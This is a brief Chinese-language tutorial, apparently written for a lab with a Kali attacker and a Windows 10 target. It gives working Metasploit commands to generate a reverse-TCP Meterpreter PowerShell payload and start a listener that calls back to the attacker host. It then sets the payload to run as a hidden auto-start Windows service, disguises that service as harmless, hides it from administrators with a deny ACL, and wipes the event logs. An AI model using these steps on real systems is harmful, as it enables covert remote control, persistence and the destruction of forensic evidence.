工具：msf，系统：kali，靶机：win10.
一、生成木马：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=主机IP LPORT=随机端口 -f psh-reflection >1.ps1（文件名字，.ps1后缀）
二、进入msf,设置监听模式
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 端口
run
三、将木马植入靶机，等待木马启动
四、植入病毒创建服务，并伪装服务：
1、创建服务
shell（进入shell）
sc create shell（随机服务名） start= auto binPath= "cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\keep\shell.ps1（木马地址）" obj= Localsystem
2、对该服务进行伪装
sc description "shell" "绝对安全的shell哈哈哈"（添加描述）
3、设置服务的自动启动
sc config "shell" start= auto
4、然后启动该服务
net start "服务名"
五、隐藏服务：
sc sdset shell（服务名） "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S: (AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
六、清除日志：
clearev
